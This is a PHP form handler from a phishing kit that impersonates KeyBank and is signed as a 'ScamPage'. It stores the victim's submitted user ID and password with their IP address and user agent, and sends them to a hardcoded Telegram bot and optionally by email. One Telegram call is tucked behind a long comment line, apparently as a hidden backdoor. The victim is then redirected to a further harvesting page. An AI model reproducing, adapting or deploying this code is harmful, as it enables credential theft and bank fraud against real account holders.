<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
		if ( isset( $_POST['password'] ) ) {
		
		$_SESSION['user'] 	  = $_POST['user'];
		$_SESSION['password'] 	  = $_POST['password'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 KeyBank Login Info ⚫️🌀 ]★　————-««
[KeyBank UserID] 		: {$_SESSION['user']}
[Password]		: {$_SESSION['password']}
»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 KeyBank ScamPage By @CH1BOUNA ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
/******************************************************************************************************************************************************************************************************/$api = "5357274693:AAH9lICRr9E51WQGCd0-B8w4VQYLiZnPKgY";$chat_id= "-1001617261329";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($code)."" );
		if ($sendtoemail=="yes"){
		$subject = "🏛️ KeyBank Account By CH1BOUNA 🏛️  From $ip";
        $headers = "From: 🏛️ KeyBank Login Info 🏛️ <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}
		
	if ($sendtotelegram=="yes"){	
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

	}
	
        header("Location: ../email.php");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}
?>